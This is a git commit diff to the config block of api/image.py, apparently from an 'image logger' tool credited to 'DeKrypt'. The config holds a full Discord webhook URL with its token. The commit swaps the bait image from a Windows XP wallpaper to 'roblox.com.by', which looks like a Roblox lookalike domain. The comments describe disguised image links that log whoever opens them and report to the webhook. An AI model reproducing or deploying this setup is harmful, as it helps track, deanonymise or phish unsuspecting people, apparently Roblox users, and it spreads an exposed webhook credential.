177a4b221e01c35bef470653bb30f1f99a96bb05
octaval746 <pepperjack6776@gmail.com>
2025-04-02 11:46:37 +1100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1356220690226741268/lAuAe8Jm2i4DuaiTmi8HUqvlE-OkgPeE3RrZODokx99CcA4NORlxnFFc6ncMeJMPiFke",
-    "image": "https://www.pcworld.com/wp-content/uploads/2023/04/Windows-XP-Bliss-desktop-large.png", # You can also have a custom image by using a URL argument
+    "image": "roblox.com.by", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
